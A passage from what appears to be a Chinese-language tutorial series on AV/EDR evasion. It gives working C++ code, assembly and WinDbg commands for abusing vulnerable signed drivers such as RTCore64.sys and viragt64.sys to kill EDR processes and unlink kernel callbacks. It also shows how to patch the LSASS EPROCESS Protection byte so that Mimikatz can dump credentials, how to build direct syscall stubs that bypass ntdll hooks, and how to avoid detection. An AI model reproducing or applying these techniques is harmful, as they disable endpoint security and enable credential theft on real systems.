IOCTL_WRITE_KERNEL_MEMORY,<br>        &amp;req, <span class="hljs-built_in">sizeof</span>(req),<br>        <span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>,<br>        &amp;bytesReturned, <span class="hljs-literal">nullptr</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用此函数将零写入或重定向EDR用于进程监控的函数指针。</p>
<hr>
<h4 id="步骤-3-–-清除EDR的Minifilter回调"><a href="#步骤-3-–-清除EDR的Minifilter回调" class="headerlink" title="步骤 3 – 清除EDR的Minifilter回调"></a><strong>步骤 3 – 清除EDR的Minifilter回调</strong></h4><p>你还可以使用相同的方法来从 <code>FLTKD</code> 数据结构中解除EDR的minifilter回调，这将防止文件操作监控（例如，磁盘落盘时AV扫描）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 示例：解除 _CALLBACK_NODE</span><br><span class="hljs-built_in">WriteKernelMemory</span>(hDriver, CallbackNodeAddr + <span class="hljs-number">0x0</span>, CallbackNodeAddr); <span class="hljs-comment">// FLINK</span><br><span class="hljs-built_in">WriteKernelMemory</span>(hDriver, CallbackNodeAddr + <span class="hljs-number">0x8</span>, CallbackNodeAddr); <span class="hljs-comment">// BLINK</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="其他BYOVD示例"><a href="#其他BYOVD示例" class="headerlink" title="其他BYOVD示例"></a>其他BYOVD示例</h3><p>LolDrivers列出了可以利用的脆弱驱动程序： <a target="_blank" rel="noopener" href="https://www.loldrivers.io/">https://www.loldrivers.io/</a></p>
<table>
<thead>
<tr>
<th>驱动程序</th>
<th>厂商</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>RTCore64.sys</td>
<td>MSI</td>
<td>用于在内核空间执行任意读&#x2F;写操作</td>
</tr>
<tr>
<td>WinIO.sys</td>
<td>WinIO</td>
<td>经常用于禁用安全产品</td>
</tr>
<tr>
<td>gdrv.sys</td>
<td>Gigabyte</td>
<td>脆弱的Gigabyte驱动程序</td>
</tr>
<tr>
<td>capcom.sys</td>
<td>Capcom</td>
<td>用于进攻性工具（例如Sliver）</td>
</tr>
</tbody></table>
<hr>
<h3 id="检测与规避"><a href="#检测与规避" class="headerlink" title="检测与规避"></a>检测与规避</h3><ul>
<li><p><strong>检测：</strong> 许多EDR现在会阻止加载已知的脆弱驱动程序。一些还会监控对 <code>ntoskrnl.exe</code> 或内存结构（如 <code>EPROCESS</code>）的访问模式。</p>
</li>
<li><p><strong>规避技术：</strong></p>
<ul>
<li><p>使用 <strong>新的或未知的脆弱驱动程序</strong>。</p>
</li>
<li><p>加密&#x2F;混淆脆弱驱动程序（防止在磁盘上直接写入）。</p>
</li>
<li><p>仅从内存加载（不进行文件写入）。</p>
</li>
<li><p>重命名驱动程序函数以避免静态Yara规则的检测。</p>
</li>
</ul>
</li>
</ul>
<hr>
<h4 id="示例-1-–-通过-viragt64-sys-杀死EDR进程（自定义PoC）"><a href="#示例-1-–-通过-viragt64-sys-杀死EDR进程（自定义PoC）" class="headerlink" title="示例 1 – 通过 viragt64.sys 杀死EDR进程（自定义PoC）"></a>示例 1 – 通过 <code>viragt64.sys</code> 杀死EDR进程（自定义PoC）</h4><p>以下PoC演示了如何加载并使用签名但脆弱的 <code>viragt64.sys</code> 驱动程序通过自定义IOCTL终止受保护的EDR进程。</p>
<h5 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub:"></a>GitHub:</h5><p><a target="_blank" rel="noopener" href="https://github.com/CyberSecurityUP/ProcessKiller-BYOVD">https://github.com/CyberSecurityUP/ProcessKiller-BYOVD</a></p>
<h5 id="概述：-2"><a href="#概述：-2" class="headerlink" title="概述："></a>概述：</h5><ul>
<li><p>加载 <code>viragt64.sys</code> 作为Windows服务。</p>
</li>
<li><p>打开设备句柄： <code>\\.\viragtlt</code>。</p>
</li>
<li><p>通过IOCTL发送进程名以通过内核终止进程。</p>
</li>
</ul>
<h5 id="关键组件："><a href="#关键组件：" class="headerlink" title="关键组件："></a>关键组件：</h5><ul>
<li><p>IOCTL代码： <code>0x82730030</code></p>
</li>
<li><p>设备路径： <code>\\.\viragtlt</code></p>
</li>
<li><p>负载： 要终止的进程名。</p>
</li>
</ul>
<h5 id="PoC使用示例："><a href="#PoC使用示例：" class="headerlink" title="PoC使用示例："></a>PoC使用示例：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ProcessKiller.exe csrss.exe<br></code></pre></td></tr></table></figure>

<h5 id="核心代码："><a href="#核心代码：" class="headerlink" title="核心代码："></a>核心代码：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">killProcessByName</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; processName)</span> </span>&#123;<br>    BYOVD_TEMPLATEIoctlStruct ioctlData;<br>    <span class="hljs-built_in">strncpy_s</span>(ioctlData.process_name, processName.<span class="hljs-built_in">c_str</span>(), <span class="hljs-built_in">sizeof</span>(ioctlData.process_name) - <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">DeviceIoControl</span>(hDevice, IOCTL_CODE, &amp;ioctlData, <span class="hljs-built_in">sizeof</span>(ioctlData),<br>                    <span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, &amp;bytesReturned, <span class="hljs-literal">nullptr</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该漏洞有效地从内核空间终止进程，即使是那些受 <code>PPL</code> 或进程篡改防护策略保护的进程。</p>
<hr>
<h4 id="示例-2-–-使用-RTCore64-sys-进行内存补丁"><a href="#示例-2-–-使用-RTCore64-sys-进行内存补丁" class="headerlink" title="示例 2 – 使用 RTCore64.sys 进行内存补丁"></a>示例 2 – 使用 <code>RTCore64.sys</code> 进行内存补丁</h4><p>另一个常用的脆弱驱动程序是 <strong>RTCore64.sys</strong>，它允许任意内核内存访问。这使得攻击者能够通过修改回调表或解除进程通知例程来禁用EDR。</p>
<h5 id="禁用进程通知回调："><a href="#禁用进程通知回调：" class="headerlink" title="禁用进程通知回调："></a>禁用进程通知回调：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">WriteKernelMemory</span>(hDriver, PsSetCreateProcessNotifyRoutineAddr, <span class="hljs-number">0x0</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uintptr_t</span>));<br></code></pre></td></tr></table></figure>

<p>这会阻止EDR接收进程创建事件。</p>
<hr>
<h4 id="通过BYOVD的其他技术："><a href="#通过BYOVD的其他技术：" class="headerlink" title="通过BYOVD的其他技术："></a>通过BYOVD的其他技术：</h4><table>
<thead>
<tr>
<th>操作</th>
<th>目标</th>
</tr>
</thead>
<tbody><tr>
<td>杀死用户态进程</td>
<td>从内核空间终止进程</td>
</tr>
<tr>
<td>禁用PPL</td>
<td>修改 <code>EPROCESS.Protection</code> 为 <code>0x0</code></td>
</tr>
<tr>
<td>解除ETW保护</td>
<td>修改 <code>EtwThreatIntProvRegHandle</code></td>
</tr>
<tr>
<td>删除minifilter回调</td>
<td>修改 <code>_CALLBACK_NODE FLINK/BLINK</code></td>
</tr>
<tr>
<td>绕过对象保护</td>
<td>修改 <code>ObjectTypeInitializers</code></td>
</tr>
</tbody></table>
<hr>
<p>这个过程通过利用脆弱驱动程序提供了强大的攻击手段，使得攻击者能够绕过EDR防护、获取内核权限并执行恶意操作。</p>
<h2 id="AV-EDR-规避实战技巧-8-5-通过-EPROCESS-内核补丁绕过-LSA-保护（PPL）"><a href="#AV-EDR-规避实战技巧-8-5-通过-EPROCESS-内核补丁绕过-LSA-保护（PPL）" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.5 - 通过 EPROCESS 内核补丁绕过 LSA 保护（PPL）"></a>AV&#x2F;EDR 规避实战技巧 - 8.5 - 通过 EPROCESS 内核补丁绕过 LSA 保护（PPL）</h2><h3 id="什么是-PPL？"><a href="#什么是-PPL？" class="headerlink" title="什么是 PPL？"></a>什么是 PPL？</h3><p><strong>PPL（Protected Process Light）</strong> 是微软推出的一种机制，用于保护像 <code>lsass.exe</code>（本地安全授权子系统服务）这样的关键系统进程，防止未经授权的访问——即便是以 SYSTEM 权限运行的进程也无法访问。</p>
<p>一旦进程通过 PPL 保护，即使是像 <strong>Mimikatz</strong> 这样的 SYSTEM 级工具也无法打开句柄，除非在一个同样受保护的进程上下文中运行，或者保护被移除。</p>
<hr>
<h3 id="示例：Mimikatz-错误"><a href="#示例：Mimikatz-错误" class="headerlink" title="示例：Mimikatz 错误"></a>示例：Mimikatz 错误</h3><p>如果在启用 PPL 保护的现代 Windows 系统上运行 Mimikatz，通常会看到如下错误：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-comment"># sekurlsa::logonpasswords</span><br>ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)<br></code></pre></td></tr></table></figure>

<p>这表明 <strong>Mimikatz</strong> 未能打开 LSASS 的句柄，因为它作为一个非受保护的进程运行，而 LSASS 启用了 LSA 保护。</p>
<hr>
<h3 id="理解内核中的保护字段"><a href="#理解内核中的保护字段" class="headerlink" title="理解内核中的保护字段"></a>理解内核中的保护字段</h3><p>进程的 <strong>保护状态</strong> 存储在 <code>EPROCESS</code> 结构中的 <code>Protection</code> 字段，它的类型是 <code>_PS_PROTECTION</code>。在 WinDbg 中，这个结构如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dt nt!_PS_PROTECTION<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">+<span class="hljs-number">0x000</span> Level          : UChar<br>+<span class="hljs-number">0x000</span> Type           : UChar  <span class="hljs-comment">// 0x0: None, 0x1: Protected, 0x2: Protected Light</span><br>+<span class="hljs-number">0x001</span> Audit          : UChar<br>+<span class="hljs-number">0x002</span> Signer         : UChar  <span class="hljs-comment">// e.g., 6: Lsa</span><br></code></pre></td></tr></table></figure>

<p>在受保护的 <code>lsass.exe</code> 中，典型值如下：</p>
<ul>
<li><p><code>Type: 2</code> → PPL</p>
</li>
<li><p><code>Signer: 6</code> → LSA</p>
</li>
</ul>
<hr>
<h3 id="通过内核补丁移除-LSASS-保护（手动）"><a href="#通过内核补丁移除-LSASS-保护（手动）" class="headerlink" title="通过内核补丁移除 LSASS 保护（手动）"></a>通过内核补丁移除 LSASS 保护（手动）</h3><h4 id="步骤-1-–-在-WinDbg-中查找-LSASS-EPROCESS"><a href="#步骤-1-–-在-WinDbg-中查找-LSASS-EPROCESS" class="headerlink" title="步骤 1 – 在 WinDbg 中查找 LSASS EPROCESS"></a>步骤 1 – 在 WinDbg 中查找 LSASS EPROCESS</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">!process 0 0 lsass.exe<br></code></pre></td></tr></table></figure>

<p>记下 EPROCESS 结构的地址。</p>
<h4 id="步骤-2-–-检查保护字段"><a href="#步骤-2-–-检查保护字段" class="headerlink" title="步骤 2 – 检查保护字段"></a>步骤 2 – 检查保护字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dt nt!_EPROCESS &lt;Address&gt; Protection<br></code></pre></td></tr></table></figure>

<p>你将看到如下信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">+0x6fa Protection : _PS_PROTECTION<br>   +0x000 Type    : 2  (PsProtectedTypeProtectedLight)<br>   +0x000 Signer  : 6  (PsProtectedSignerLsa)<br></code></pre></td></tr></table></figure>

<h4 id="步骤-3-–-移除保护"><a href="#步骤-3-–-移除保护" class="headerlink" title="步骤 3 – 移除保护"></a>步骤 3 – 移除保护</h4><p>你可以手动将 <code>Protection</code> 字节修改为 <code>0x0</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eb &lt;lsass_EPROCESS&gt;+&lt;Offset_Protection&gt; 0x00<br></code></pre></td></tr></table></figure>

<p>示例（假设偏移为 0x6fa）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eb ffffcb0c`2b125080+6fa 00<br></code></pre></td></tr></table></figure>

<p>这样，Mimikatz 将能够正常工作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-comment"># sekurlsa::logonpasswords</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="使用易受攻击的驱动（PoC）自动化补丁"><a href="#使用易受攻击的驱动（PoC）自动化补丁" class="headerlink" title="使用易受攻击的驱动（PoC）自动化补丁"></a>使用易受攻击的驱动（PoC）自动化补丁</h3><p>你可以使用 <strong>BYOVD</strong>（带上自己的易受攻击驱动）的方法，借助一个允许任意内核内存写入的签名驱动来自动化这个补丁过程。</p>
<h4 id="关键步骤："><a href="#关键步骤：" class="headerlink" title="关键步骤："></a>关键步骤：</h4><ol>
<li><p>枚举进程并找到 LSASS。</p>
</li>
<li><p>通过 PsActiveProcessLinks 遍历或 NtQuerySystemInformation 查找 LSASS EPROCESS。</p>
</li>
<li><p>计算到 <code>Protection</code> 的偏移。</p>
</li>
<li><p>在 <code>EPROCESS + ProtectionOffset</code> 处写入 <code>0x00</code>。</p>
</li>
</ol>
<h4 id="演示代码（使用-RTCore64-或-Capcom-sys-的内核补丁）"><a href="#演示代码（使用-RTCore64-或-Capcom-sys-的内核补丁）" class="headerlink" title="演示代码（使用 RTCore64 或 Capcom.sys 的内核补丁）"></a>演示代码（使用 RTCore64 或 Capcom.sys 的内核补丁）</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RemoveLsaProtection</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> lsass_eprocess, <span class="hljs-type">uint64_t</span> protection_offset)</span> </span>&#123;<br>    <span class="hljs-type">uint8_t</span> patch = <span class="hljs-number">0x00</span>;<br>    <span class="hljs-built_in">WriteKernelMemory</span>(driverHandle, lsass_eprocess + protection_offset, &amp;patch, <span class="hljs-built_in">sizeof</span>(patch));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用 <code>DeviceIoControl</code> 或自定义映射驱动程序来应用此补丁。</p>
<hr>
<h3 id="避免检测"><a href="#避免检测" class="headerlink" title="避免检测"></a>避免检测</h3><p>为了避免在绕过 PPL 时被检测到：</p>
<ul>
<li><p>只补丁 <strong>一个字节</strong>（精确写入）。</p>
</li>
<li><p>使用后卸载你的驱动（例如使用 <code>KDMapper</code> 或 <code>TigressMapper</code>）。</p>
</li>
<li><p>在内存中混淆字符串（<code>LSASS</code>、<code>Protection</code> 等）。</p>
</li>
<li><p>在调用 Mimikatz 或类似工具之前，<strong>即时</strong> 执行此操作。</p>
</li>
</ul>
<hr>
<h3 id="真实场景"><a href="#真实场景" class="headerlink" title="真实场景"></a>真实场景</h3><p>在许多红队操作中，防御者严重依赖 PPL 来保护 <code>lsass.exe</code> 并检测内存篡改。绕过这一防御措施可以清洁地提取凭证，即使在强化的环境中也是如此。这里描述的方法被现代 APT 和后期利用框架（如 Cobalt Strike 和 Sliver）使用，通过 <strong>BOF 或内核阶段工具</strong>。</p>
<hr>
<h3 id="限制和注意事项"><a href="#限制和注意事项" class="headerlink" title="限制和注意事项"></a>限制和注意事项</h3><ul>
<li><p>需要 <strong>内核级访问权限</strong>（通过易受攻击的驱动、漏洞或引导工具）。</p>
</li>
<li><p>无法在没有此类权限的标准用户模式下执行。</p>
</li>
<li><p>补丁是 <strong>易失性的</strong>（重启后会重置）。</p>
</li>
</ul>
<hr>
<h3 id="总结表"><a href="#总结表" class="headerlink" title="总结表"></a>总结表</h3><table>
<thead>
<tr>
<th>技术</th>
<th>目标</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>通过 WinDbg 内核补丁</td>
<td>EPROCESS</td>
<td>手动移除 PPL</td>
</tr>
<tr>
<td>BYOVD 自动化</td>
<td>易受攻击的驱动</td>
<td>程序化移除 PPL</td>
</tr>
<tr>
<td>绕过后的使用</td>
<td>LSASS &#x2F; Mimikatz</td>
<td>凭证转储成功</td>
</tr>
</tbody></table>
<h2 id="AV-EDR-规避实战技巧-8-6-从头实现-NTDLL-函数（自定义-NTDLL-存根）"><a href="#AV-EDR-规避实战技巧-8-6-从头实现-NTDLL-函数（自定义-NTDLL-存根）" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.6 - 从头实现 NTDLL 函数（自定义 NTDLL 存根）"></a>AV&#x2F;EDR 规避实战技巧 - 8.6 - 从头实现 NTDLL 函数（自定义 NTDLL 存根）</h2><h3 id="概述-8"><a href="#概述-8" class="headerlink" title="概述"></a>概述</h3><p>现代 EDR（端点检测和响应系统）广泛依赖于对 <code>ntdll.dll</code> 函数的 <strong>用户模式钩子</strong> 来监视和阻止可疑行为，尤其是像 <code>NtOpenProcess</code>、<code>NtAllocateVirtualMemory</code>、<code>NtWriteVirtualMemory</code>、<code>NtCreateThreadEx</code> 等系统调用。</p>
<p>本节将探讨如何 <strong>手动重新实现这些 NTDLL 函数</strong>，通过直接调用系统调用（syscalls）而绕过用户模式 API 钩子，使用自定义的 shellcode 或 syscall 存根。这项技术确保了 <strong>隐蔽性</strong> 和 <strong>EDR 绕过</strong>，在进攻性操作中至关重要。</p>
<hr>
<h3 id="为什么要重新实现-NTDLL-函数？"><a href="#为什么要重新实现-NTDLL-函数？" class="headerlink" title="为什么要重新实现 NTDLL 函数？"></a>为什么要重新实现 NTDLL 函数？</h3><ul>
<li><p>EDR 会将内联钩子放入 <code>ntdll.dll</code> 中，用于拦截和检查行为。</p>
</li>
<li><p>即使你卸载了 NTDLL（例如通过重新映射），新进程加载的 DLL 仍可能会被钩住。</p>
</li>
<li><p>在内存中重新实现系统调用可以完全避免 NTDLL。</p>
</li>
<li><p>你可以完全控制系统调用存根和调用约定。</p>
</li>
</ul>
<hr>
<h3 id="步骤：构建手动的系统调用存根"><a href="#步骤：构建手动的系统调用存根" class="headerlink" title="步骤：构建手动的系统调用存根"></a>步骤：构建手动的系统调用存根</h3><h3 id="步骤-1-–-查找系统调用编号"><a href="#步骤-1-–-查找系统调用编号" class="headerlink" title="步骤 1 – 查找系统调用编号"></a>步骤 1 – 查找系统调用编号</h3><p>系统调用编号在不同的 Windows 构建中可能有所不同，最佳的方法是动态提取它。</p>
<p>你可以从磁盘上的 <strong>干净版本</strong> <code>ntdll.dll</code> 或从 <code>KnownDlls</code> 提取系统调用编号。</p>
<p>例如，下面是如何提取 <code>NtOpenProcess</code> 的系统调用编号：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// NtOpenProcess 操作码示例（x64）</span><br>mov r10, rcx<br>mov eax, <span class="hljs-number">0x26</span>        ; NtOpenProcess 的系统调用编号（与构建相关）<br>syscall<br>ret<br></code></pre></td></tr></table></figure>

<h3 id="步骤-2-–-自定义系统调用存根（汇编）"><a href="#步骤-2-–-自定义系统调用存根（汇编）" class="headerlink" title="步骤 2 – 自定义系统调用存根（汇编）"></a>步骤 2 – 自定义系统调用存根（汇编）</h3><p>下面是 <code>NtOpenProcess</code> 的原始系统调用存根：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>global NtOpenProcess_custom<br><br>NtOpenProcess_custom:<br>    mov r10, rcx<br>    mov eax, 0x26        ; 替换为实际的系统调用编号<br>    syscall<br>    ret<br></code></pre></td></tr></table></figure>

<h3 id="步骤-3-–-将存根注入内存（C-）"><a href="#步骤-3-–-将存根注入内存（C-）" class="headerlink" title="步骤 3 – 将存根注入内存（C++）"></a>步骤 3 – 将存根注入内存（C++）</h3><p>你可以通过函数指针将此存根注入内存：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtOpenProcess_t)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PHANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">    ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">    POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">    PCLIENT_ID ClientId</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">AllocateSyscallStub</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> syscall_stub[] = &#123;<br>        <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>,        <span class="hljs-comment">// mov r10, rcx</span><br>        <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// mov eax, 0x26（替换）</span><br>        <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>,              <span class="hljs-comment">// syscall</span><br>        <span class="hljs-number">0xC3</span>                    <span class="hljs-comment">// ret</span><br>    &#125;;<br><br>    <span class="hljs-type">void</span>* exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-built_in">sizeof</span>(syscall_stub),<br>        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, syscall_stub, <span class="hljs-built_in">sizeof</span>(syscall_stub));<br>    <span class="hljs-keyword">return</span> exec;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后使用它：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">NtOpenProcess_t myNtOpenProcess = (NtOpenProcess_t)<span class="hljs-built_in">AllocateSyscallStub</span>();<br>HANDLE hProc = <span class="hljs-literal">NULL</span>;<br>OBJECT_ATTRIBUTES oa = &#123; <span class="hljs-number">0</span> &#125;;<br>CLIENT_ID cid = &#123; <span class="hljs-number">0</span> &#125;;<br><br>cid.UniqueProcess = (HANDLE)targetPid;<br><br>NTSTATUS status = <span class="hljs-built_in">myNtOpenProcess</span>(&amp;hProc, PROCESS_ALL_ACCESS, &amp;oa, &amp;cid);<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="附加功能：编程提取系统调用编号"><a href="#附加功能：编程提取系统调用编号" class="headerlink" title="附加功能：编程提取系统调用编号"></a>附加功能：编程提取系统调用编号</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">DWORD <span class="hljs-title">GetSyscallNumber</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* functionName)</span> </span>&#123;<br>    HMODULE hNtdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    BYTE* addr = (BYTE*)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, functionName);<br><br>    <span class="hljs-keyword">if</span> (!addr || addr[<span class="hljs-number">0</span>] != <span class="hljs-number">0x4C</span> || addr[<span class="hljs-number">1</span>] != <span class="hljs-number">0x8B</span> || addr[<span class="hljs-number">2</span>] != <span class="hljs-number">0xD1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 不是有效的系统调用存根</span><br><br>    <span class="hljs-keyword">if</span> (addr[<span class="hljs-number">3</span>] == <span class="hljs-number">0xB8</span>) &#123;<br>        DWORD syscallNumber = *(DWORD*)(addr + <span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">return</span> syscallNumber;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="优势-1"><a href="#优势-1" class="headerlink" title="优势"></a>优势</h3><table>
<thead>
<tr>
<th>优势</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>绕过钩子</strong></td>
<td>不使用被 EDR 钩住的 ntdll.dll 函数。</td>
</tr>
<tr>
<td><strong>隐蔽性</strong></td>
<td>你控制何时以及如何调用敏感的 API。</td>
</tr>
<tr>
<td><strong>跨兼容性</strong></td>
<td>适用于跨进程，甚至在反射性有效载荷中。</td>
</tr>
</tbody></table>
<hr>
<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><ul>
<li><p>系统调用编号在不同的 Windows 构建中会有所变化（使用动态解析）。</p>
</li>
<li><p>系统调用可能会被 <strong>内核补丁保护（KPP）</strong> 或 <strong>内核回调</strong> 阻止。</p>
</li>
<li><p>在不正确的上下文中调用系统调用（例如 WoW64）可能导致崩溃。</p>
</li>
</ul>
<hr>
<h3 id="真实世界应用"><a href="#真实世界应用" class="headerlink" title="真实世界应用"></a>真实世界应用</h3><ol>
<li><p><strong>Shellcode 加载器</strong>，如 <strong>SharpLoader</strong>、<strong>SysWhispers</strong> 和 <strong>HellShell</strong> 使用了这一技术。</p>
</li>
<li><p><strong>EDR 绕过框架</strong> 替换 API 调用为硬编码的系统调用。</p>
</li>
<li><p><strong>反射性 DLL</strong> 或 <strong>仅内存植入物</strong> 包括自定义的系统调用表以避免用户模式。</p>
</li>
</ol>
<hr>
<h3 id="最终笔记"><a href="#最终笔记" class="headerlink" title="最终笔记"></a>最终笔记</h3><ul>
<li><p>你可以在植入物中动态实现一个完整的 <code>syscall resolver</code>。</p>
</li>
<li><p>使用像 <strong>SysWhispers2&#x2F;3</strong> 这样的工具自动化此过程，并保持最新的系统调用编号。</p>
</li>
<li><p>可选地，结合 <strong>栈欺骗</strong> 和 <strong>返回地址重定向</strong> 来提高隐蔽性。</p>
</li>
</ul>
<h2 id="AV-EDR-规避实战技巧-8-7-钩子检测与绕过（内联钩子，IAT-钩子等）"><a href="#AV-EDR-规避实战技巧-8-7-钩子检测与绕过（内联钩子，IAT-钩子等）" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.7 - 钩子检测与绕过（内联钩子，IAT 钩子等）"></a>AV&#x2F;EDR 规避实战技巧 - 8.7 - 钩子检测与绕过（内联钩子，IAT 钩子等）</h2><h3 id="概述-9"><a href="#概述-9" class="headerlink" title="概述"></a>概述</h3><p>现代 EDR 系统通常依赖于 <strong>用户模式 API 钩子</strong> 来监视和控制恶意行为。最常见的技术包括：</p>
<ul>
<li><p><strong>内联钩子（Inline Hooks）</strong> – 修改关键函数的前几个字节（例如 <code>NtOpenProcess</code>）以跳转到监视存根。</p>
</li>
<li><p><strong>IAT（导入地址表）钩子</strong> – 更改模块导入表中的函数指针，将 API 调用重定向。</p>
</li>
</ul>
<p>本节将重点讨论如何 <strong>检测</strong>、<strong>移除</strong> 和 <strong>绕过</strong> 用户模式下的这些钩子。</p>
<hr>
<h3 id="1-API-钩子类型"><a href="#1-API-钩子类型" class="headerlink" title="1. API 钩子类型"></a>1. API 钩子类型</h3><table>
<thead>
<tr>
<th>钩子类型</th>
<th>机制</th>
</tr>
</thead>
<tbody><tr>
